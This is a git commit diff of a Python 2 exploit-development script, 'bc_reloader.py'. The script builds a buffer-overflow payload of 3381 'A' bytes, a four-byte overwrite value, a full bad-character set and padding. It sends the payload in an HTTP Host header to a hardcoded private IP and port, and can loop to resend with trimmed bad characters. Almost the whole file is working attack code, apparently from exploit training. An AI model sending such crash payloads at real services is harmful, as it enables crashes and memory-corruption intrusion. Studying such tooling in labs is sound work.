2ff0c7546073aab6bdb5b50a57987f0dd2f051af
root <root@localhost.localdomain>
2019-01-17 14:30:20 -0800

    corrected several errors

--- bc_reloader.py
+++ bc_reloader.py
@@ -9,6 +9,8 @@
 import socket
 import os
 import sys
+import binascii
+#import subprocess
 
 ip="192.168.100.187"
 port=int(7510)
@@ -21,15 +23,30 @@ totalsize=int(4000)
 #
 # Below the initial charset is defined.
 # I took the liberty of removing ,\x00,\x0a,\x0d and ,\x20, which is an informal SOP for me when it comes to payload development.
-#
 
-#
-# I named this array lexor because I thought the word hexarray was messing it up
-#
-lexor=["01","02","03","04","05","06","07","08","09","0b","0c","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe","ff"]
+badchar = (
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
 
 #
 # Setting the initial while variable "bugging"
+# As long as "bugging" equals yes, this script will allow you to 
+# Trim the bad character set as much as you need to
+#
 bugging="yes"
 
 #
@@ -39,56 +56,44 @@ bugging="yes"
 while bugging == "yes":
     print "[-] Please enter any bad characters you would like to exclude from the character set.\r\n"
     print "[-] By default, this script has 00, 0a, 0d and 20 removed in the original array"
+    print "[-] You may also just hit enter to repeat the last payload\n"
     excludes=raw_input("[-] Make sure target is READY, then enter the characters to exclude in hex separated by a comma : ").split(',')
 
 
     #
-    # This nested for loop removes the bad characters elected by the user
+    # This loop removes the bad characters elected by the user
     #
     for loop0 in excludes:
-        for loop1 in lexor:
-            # Test command follows : print loop0, loop1
-            if loop0 == loop1:
-                lexor.remove(loop1)
-
+	# Need to add the \x deliminator to the bad character
+        purge="\\x"+loop0
+	# This command convert the string concatenated with \x and the user array to ascii
+        purge=binascii.unhexlify(loop0)
+        # This redefines the variable badchar and removes the variable we just created
+        # It was tested on debugger and wireshark by simply removing 4a or capital J
+	badchar = badchar.replace(purge, '')
     #
-    # Array lexor now has the user selected "bad characters" removed
-    #
-
-    #
-    # Now that the bad characters have been removed from the array, we can convert the array to a string.
+    # Debugging sequence.
     #
 
-    test4bad=""
-    for loop2 in lexor:
-        test4bad+=loop2
-
-    # test command follow print test4bad
-    # exit()
-
-    #
-    # Define the length of the test4bad string now that we have removed the bad characters and maintain a 4000 bytes buffer
-    #
-    trim=(len(test4bad))
-    # debug command print trim
+    #print "bad characters are : \n"
+    #print badchar
+    #exit()
 
     #
     # Build the crash payload
     #
-    crash = "A"*3381 
-    crash += "B"*4 
-    crash += test4bad 
-    crash += "C" * (615 - trim)
+    crash = "A"*3381 + "\x6f\x22\x44\x44" + badchar
+    trim=len(crash)
+    crash += "C" * (totalsize - trim)
     #
-    # Test commands follow, does not hurt if you enable them. Kinda cool to watch
-    # After 2 or 3 runs and you observe the C's increasing while triming your 
-    # bad characters
+    # Test commands follow, fun to watch though
     # print crash
     # print "total size = "
     # print len(crash)
+    # exit()
     # End test commands
 
-    # Building the buffer
+    # Build the HTTP request, based on WireShark / Burp
 
     buffer="GET " + url + " HTTP/1.1\r\n"
     buffer+="Host: " + crash + "\r\n"
@@ -114,8 +119,9 @@ while bugging == "yes":
     #
     # let's clear that exclude array
     excludes == []
-    
+
+    # Here the user elects to repeat or exit, leveraging use of the array, the characters previously trimmed, and we can RELOAD!
     bugging=raw_input("[-] Would you like to send another payload? If so enter yes or the script exits : ")
-            
+
 print "[-] Script complete"
 exit()
